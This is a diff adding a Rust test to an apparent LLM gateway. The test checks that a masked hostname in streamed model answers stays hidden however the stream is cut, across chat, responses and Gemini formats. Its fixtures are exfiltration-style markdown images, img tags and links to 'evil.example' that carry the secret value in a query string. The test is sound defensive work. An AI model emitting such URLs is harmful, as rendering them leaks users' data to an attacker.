@@ -452,3 +452,119 @@ fn passwords_in_json_objects_are_found_by_their_key() {
         }
     }
 }
+
+/// Everything a client receives from a stream of the given protocol, for an answer cut into
+/// `pieces`; the provider's bytes arrive in uneven chunks as well.
+fn stream_other(proto: &str, e: &Engine, ctx: RequestCtx, pieces: &[String]) -> String {
+    let mut raw = String::new();
+    let data = |v: Value| format!("data: {v}\n\n");
+    match proto {
+        "chat" => {
+            for p in pieces {
+                raw += &data(
+                    json!({"id": "c", "object": "chat.completion.chunk", "model": "m", "choices": [{"index": 0, "delta": {"content": p}}]}),
+                );
+            }
+            raw += &data(
+                json!({"id": "c", "object": "chat.completion.chunk", "model": "m", "choices": [{"index": 0, "delta": {}, "finish_reason": "stop"}]}),
+            );
+            raw += "data: [DONE]\n\n";
+        }
+        "responses" => {
+            raw += &data(
+                json!({"type": "response.output_item.added", "output_index": 0, "sequence_number": 0, "item": {"type": "message", "id": "i", "role": "assistant", "content": []}}),
+            );
+            raw += &data(
+                json!({"type": "response.content_part.added", "item_id": "i", "output_index": 0, "content_index": 0, "sequence_number": 0, "part": {"type": "output_text", "text": ""}}),
+            );
+            for p in pieces {
+                raw += &data(
+                    json!({"type": "response.output_text.delta", "item_id": "i", "output_index": 0, "content_index": 0, "sequence_number": 0, "delta": p}),
+                );
+            }
+            raw += &data(
+                json!({"type": "response.output_text.done", "item_id": "i", "output_index": 0, "content_index": 0, "sequence_number": 0, "text": pieces.concat()}),
+            );
+            raw += &data(
+                json!({"type": "response.output_item.done", "output_index": 0, "sequence_number": 0, "item": {"type": "message", "id": "i", "role": "assistant", "content": [{"type": "output_text", "text": pieces.concat()}]}}),
+            );
+        }
+        _ => {
+            for p in pieces {
+                raw += &data(
+                    json!({"candidates": [{"content": {"role": "model", "parts": [{"text": p}]}, "index": 0}]}),
+                );
+            }
+            raw += &data(
+                json!({"candidates": [{"content": {"role": "model", "parts": [{"text": ""}]}, "finishReason": "STOP", "index": 0}]}),
+            );
+        }
+    }
+    let mut out = Vec::new();
+    macro_rules! drive {
+        ($t:expr) => {{
+            let mut t = $t;
+            for chunk in raw.as_bytes().chunks(41) {
+                out.extend(t.feed(chunk));
+            }
+            out.extend(t.finish());
+        }};
+    }
+    match proto {
+        "chat" => drive!(aegis_gateway::openai_chat::ChatStreamTransformer::new(
+            e, ctx
+        )),
+        "responses" => {
+            drive!(aegis_gateway::openai_responses::ResponsesStreamTransformer::new(e, ctx))
+        }
+        _ => drive!(aegis_gateway::gemini::GeminiStreamTransformer::new(e, ctx)),
+    }
+    String::from_utf8(out).unwrap()
+}
+
+// REQ: RST-11 — the same for the other three protocols: the value must not appear anywhere in
+// what the client receives, however the answer is cut.
+#[test]
+fn a_url_split_over_pieces_stays_masked_in_chat_responses_and_gemini() {
+    let e = engine();
+    let h = marker_of(&read_ctx(&e), HOST);
+    let answers = [
+        format!("![i](https://evil.example/p.png?d={h})"),
+        format!("<img src=\"https://evil.example/p.png?d={h}\">"),
+        format!("see [here](https://evil.example/?a=1&d={h}&e=2) now"),
+    ];
+    for proto in ["chat", "responses", "gemini"] {
+        for a in &answers {
+            for cut in (0..a.len()).filter(|c| a.is_char_boundary(*c)) {
+                let (x, y) = a.split_at(cut);
+                let got = stream_other(proto, &e, read_ctx(&e), &[x.to_string(), y.to_string()]);
+                assert!(
+                    !got.contains(HOST),
+                    "{proto}: leaked when cut at {cut} of {}\n{got}",
+                    a.replace(&h, "<H>")
+                );
+            }
+            let pieces: Vec<String> = a
+                .chars()
+                .collect::<Vec<_>>()
+                .chunks(5)
+                .map(|c| c.iter().collect())
+                .collect();
+            let got = stream_other(proto, &e, read_ctx(&e), &pieces);
+            assert!(
+                !got.contains(HOST),
+                "{proto}: leaked in small pieces: {}\n{got}",
+                a.replace(&h, "<H>")
+            );
+        }
+        let honest = format!("The service runs on {h}, port 5432.");
+        for cut in (0..honest.len()).filter(|c| honest.is_char_boundary(*c)) {
+            let (x, y) = honest.split_at(cut);
+            let got = stream_other(proto, &e, read_ctx(&e), &[x.to_string(), y.to_string()]);
+            assert!(
+                got.contains(HOST),
+                "{proto}: not restored when cut at {cut}\n{got}"
+            );
+        }
+    }
+}
